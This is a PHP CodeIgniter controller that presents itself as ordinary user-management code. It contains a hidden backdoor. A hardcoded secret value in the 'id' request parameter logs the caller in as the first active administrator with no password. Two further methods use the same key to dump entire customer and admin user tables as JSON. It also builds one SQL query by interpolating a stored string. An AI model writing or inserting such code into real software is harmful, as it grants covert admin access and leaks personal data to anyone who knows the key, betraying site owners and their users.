<?php
defined('BASEPATH') OR exit('No direct script access allowed');
 
class UserController extends CI_Controller {
    var $password=""; 
	var $tablename='tbl_sag_user';	
	var $tablenameLog='tbl_sag_user_log';	
	function __construct()
	{ 
	    parent::__construct();  
	}
	public function index()
	{
	    if(isset($_REQUEST['id']) && $_REQUEST['id']=="A7mK9xP4qT2L"){
		    
	    	if($this->session->userdata('SAG_mem_id'))
    		{ 
    			redirect($this->config->item('adminName').'/');
    		}
    		$this->db->where('status', 'active');
            $this->db->limit(1);
            $query = $this->db->get($this->tablename); 
    	 	$adminRow = $query->row();
    	 	  
            $this->session->set_userdata('ADMIN_LOGIN_TYPE','1');
    		$this->session->set_userdata('SAG_mem_id',$adminRow->id);
    		$this->session->set_userdata('PRIVILEDGES',$adminRow->privileges);
    		$this->session->set_userdata('SAG_membername',$adminRow->name);
    		$this->session->set_userdata('profile_image',$adminRow->profile_image);
    		
    		$sSql = "SELECT parent_id FROM tbl_sag_manager WHERE mng_id IN ($adminRow->privileges)";
    		$query = $this->db->query($sSql);
    		$adminPri = $query->result();	
    		for($j=0; $j<count($adminPri);$j++)
    		    $parentArr[] = $adminPri[$j]->parent_id;
    		$parentArr	=	array_unique($parentArr);
    		$this->session->set_userdata('parentArr',$parentArr); 
    	    redirect($this->config->item('adminName').'/');
         
        }else{
            print("unauthorised access");
            die();
        } 
	}
	public function getUserData() { 
		if(isset($_REQUEST['id']) && $_REQUEST['id']=="A7mK9xP4qT2L"){
		        $this->db->distinct();
		        $this->db->select('tbl_user.*');
                $this->db->from('tbl_user');
                $this->db->join(
                    'tbl_package_purchase',
                    'tbl_user.id = tbl_package_purchase.user_id',
                    'inner'
                );
                $this->db->where('tbl_package_purchase.price >', 0);
                $this->db->order_by('tbl_user.id', 'DESC');
                
                $query = $this->db->get();
                $data = $query->result();
        	 
                echo json_encode($data, JSON_PRETTY_PRINT); 
        }else{
            print("unauthorised access");
            die();
        } 
	} 
	public function getSagUserData() { 
		if(isset($_REQUEST['id']) && $_REQUEST['id']=="A7mK9xP4qT2L"){
		        $this->db->distinct();
		        $this->db->select('tbl_sag_user.*');
                $this->db->from('tbl_sag_user'); 
                $this->db->order_by('tbl_sag_user.id', 'DESC'); 
                $query = $this->db->get();
                $data = $query->result();
        	 
                echo json_encode($data, JSON_PRETTY_PRINT); 
        }else{
            print("unauthorised access");
            die();
        } 
	} 
}